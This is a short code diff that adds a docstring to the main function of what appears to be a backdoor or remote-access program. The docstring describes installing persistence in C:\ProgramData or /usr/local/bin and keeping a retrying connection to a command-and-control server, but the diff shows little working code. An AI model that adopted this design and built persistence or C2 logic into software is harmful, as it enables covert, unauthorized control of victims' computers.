@@ -74,6 +74,21 @@ def run(host, port):
 
 
 def main():
+    """
+    Main execution function that handles persistence and connection to C2 server.
+    
+    This function:
+    1. Checks if running from system directory
+    2. If not in system directory, sets up persistence
+    3. If already in system directory, maintains connection to C2 server
+    4. Implements error handling and reconnection logic
+    
+    Behavior:
+    - Windows: Uses C:\ProgramData\ as system path
+    - Linux: Uses /usr/local/bin/ as system path
+    - Maintains persistent connection with 30-second retry interval
+    """
+
     # Determine system path based on OS
     system_path = "C:\\ProgramData\\" if sys.platform == "win32" else "/usr/local/bin/"
 
